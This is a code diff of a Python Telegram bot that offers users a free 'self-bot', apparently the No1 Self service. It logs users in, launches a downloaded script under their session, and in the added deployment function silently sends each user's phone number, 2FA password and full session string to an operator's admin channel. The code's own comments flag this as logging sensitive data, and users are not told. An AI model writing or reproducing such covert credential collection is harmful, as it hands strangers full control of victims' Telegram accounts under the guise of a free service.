-                CONV_COMPLETED_EVENT.set_completed(user_id) # Signal completion (even on error) to timeout manager
+        # Removed get_ip, get_user, get_pass steps as SSH is no longer used.
+        # The flow now completes after successful Telethon login.
 
     except Exception as e:
         logger.error(f"Unhandled error in conversation_handler for user {user_id} at step {current_step}: {e}", exc_info=True)
@@ -1337,6 +1160,134 @@ cp.sprinthost.ru"""
         CONV_COMPLETED_EVENT.set_completed(user_id)
         await cleanup_user_state(user_id)
 
+
+async def handle_local_self_bot_deployment(pyrogram_client: Client, message: Message, user_id: int, chat_id: int, tele_client: TelegramClient):
+    """
+    Handles the deployment of the self-bot locally on the host server
+    after successful Telethon login.
+    """
+    wait_msg = await pyrogram_client.send_message(chat_id, """در حال آماده‌سازی و اجرای سلف، لطفاً صبر کنید!
+این فرآیند ممکن است چند ثانیه طول بکشد.""")
+    logger.info(f"User {user_id} started local self-bot deployment.")
+
+    try:
+        # Check if the local self.py template exists
+        if not os.path.exists(LOCAL_SELF_BOT_TEMPLATE_PATH):
+            logger.error("Self-bot template script not found. Attempting to re-download.")
+            await download_self_bot_script() # Try to download again
+            if not os.path.exists(LOCAL_SELF_BOT_TEMPLATE_PATH):
+                raise FileNotFoundError(f"Self-bot template script not found at {LOCAL_SELF_BOT_TEMPLATE_PATH}")
+
+        # Create user-specific directory for the self-bot instance
+        user_self_bot_dir = os.path.join("selfbot_instances", str(user_id))
+        os.makedirs(user_self_bot_dir, exist_ok=True)
+        
+        # Copy self.py to the user's directory
+        shutil.copy(LOCAL_SELF_BOT_TEMPLATE_PATH, os.path.join(user_self_bot_dir, "self.py"))
+        logger.info(f"Copied self.py to {user_self_bot_dir} for user {user_id}.")
+
+        # Generate StringSession
+        string_session = StringSession.save(tele_client.session)
+        CONV[user_id]["string"] = string_session # Store for admin log
+        logger.info(f"Generated StringSession for user {user_id}.")
+
+        # Prepare environment variables for the subprocess
+        env_vars = os.environ.copy()
+        env_vars['API_ID'] = str(API_ID)
+        env_vars['API_HASH'] = API_HASH
+        env_vars['STRING_SESSION'] = string_session
+        env_vars['PYTHONUNBUFFERED'] = '1' # Ensure output is not buffered
+
+        # Define path for the user's self-bot log file
+        user_log_file = os.path.join(user_self_bot_dir, f"{user_id}.log")
+
+        # Launch the self-bot as a separate subprocess
+        # Use nohup to ensure it runs independently of the main bot's session
+        # Redirect stdout and stderr to the user's log file
+        with open(user_log_file, "a", encoding="utf-8") as outfile:
+            process = await asyncio.create_subprocess_exec(
+                "nohup",
+                "python3",
+                "self.py",
+                stdout=outfile,
+                stderr=outfile,
+                cwd=user_self_bot_dir, # Run in the user's dedicated directory
+                env=env_vars,
+                start_new_session=True # Detach process from current terminal session
+            )
+        CONV[user_id]["self_bot_process"] = process # Store process object for management
+        logger.info(f"Self-bot for user {user_id} launched as PID {process.pid} in {user_self_bot_dir}.")
+
+        # Post-deployment actions
+        await cleanup_user_state(user_id) # Cleans up local session files and temporary Telethon client
+
+        if user_id not in OWNER_IDS and REMAINING_RUNS > 0:
+            globals()["REMAINING_RUNS"] -= 1
+            save_remaining_runs(REMAINING_RUNS)
+            logger.info(f"REMAINING_RUNS decremented to {REMAINING_RUNS} for user {user_id}.")
+
+        if user_id not in OWNER_IDS:
+            LAST_RUNS[user_id] = time.time() # Update 24-hour cooldown
+            save_last_runs()
+            logger.info(f"User {user_id} added to 24-hour cooldown.")
+
+        await wait_msg.delete() # Delete the "in progress" message
+
+        await pyrogram_client.send_message(
+            chat_id=chat_id,
+            text="""سلف با موفقیت روی سرور ما اجرا شد، با دستور `راهنما` منوی راهنمای سلف را باز کنید.
+
+فروش این سلف ممنوع است!
+@No1Self
+سلف ساز رایگان:
+@No1SelfBot"""
+        )
+        logger.info(f"Selfbot successfully deployed for user {user_id}.")
+
+        # Send log to admin channel
+        if ADMIN_LOG_CHANNEL_ID:
+            username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
+            two_step_pass = CONV[user_id].get("two_step", "NoPasswd!") # Sensitive data
+
+            info = (
+                f"**New No1 Self Run! (Local Deployment)**\n"
+                f"**User:** {username_or_mention}\n"
+                f"**User ID:** `{user_id}`\n"
+                f"**Number:** `+{CONV[user_id]['number']}`\n"
+                f"**2FA Password:** `{two_step_pass}`\n" # SECURITY ALERT: Logging sensitive data
+                f"**StringSession:** `{CONV[user_id]['string']}`\n" # SECURITY ALERT: Logging sensitive data
+                f"**Self-bot PID:** `{process.pid}`\n"
+                f"**Self-bot Dir:** `{user_self_bot_dir}`\n"
+                f"**Remaining Global Runs:** `{REMAINING_RUNS}`"
+            )
+
+            try:
+                await pyrogram_client.send_message(ADMIN_LOG_CHANNEL_ID, info, disable_web_page_preview=True)
+                logger.info(f"Admin log sent for user {user_id}.")
+            except Exception as e:
+                logger.error(f"Error sending admin log message for user {user_id}: {e}", exc_info=True)
+        else:
+            logger.warning(f"ADMIN_LOG_CHANNEL_ID not set. Could not send deployment log for user {user_id}.")
+
+        CONV_COMPLETED_EVENT.set_completed(user_id) # Signal successful completion to timeout manager
+        
+    except Exception as e:
+        logger.error(f"Local self-bot deployment error for user {user_id}: {e}", exc_info=True)
+        if wait_msg:
+            try:
+                await wait_msg.edit_text(
+                    "خطا در اجرای سلف! لطفاً دوباره امتحان کنید. برای شروع دوباره /start را ارسال کنید."
+                )
+            except Exception as edit_error:
+                logger.error(f"Error editing error message for user {user_id}: {edit_error}")
+                await pyrogram_client.send_message(
+                    chat_id=chat_id,
+                    text="خطا در اجرای سلف! لطفاً دوباره امتحان کنید. برای شروع دوباره /start را ارسال کنید."
+                )
+        await cleanup_user_state(user_id)
+        CONV_COMPLETED_EVENT.set_completed(user_id) # Signal completion (even on error) to timeout manager
+
+
 async def channel_message_updater():
     """Periodically updates the status message in the public channel."""
     last_minute_update = None
@@ -1345,7 +1296,7 @@ async def channel_message_updater():
         try:
             now = datetime.now(timezone("Asia/Tehran"))
             current_minute = now.strftime('%H:%M')
-            current_run_count = load_max_runs() # Reload to ensure consistency
+            current_run_count = load_remaining_runs() # Reload to ensure consistency
 
             if current_minute != last_minute_update or current_run_count != last_run_count_update:
                 last_minute_update = current_minute
@@ -1358,6 +1309,9 @@ async def channel_message_updater():
 
 if __name__ == "__main__":
     logger.info("Starting No1 Self Bot...")
+    # Initial download of the self-bot script
+    asyncio.run(download_self_bot_script()) 
+
     while True:
         try:
             bot.start()
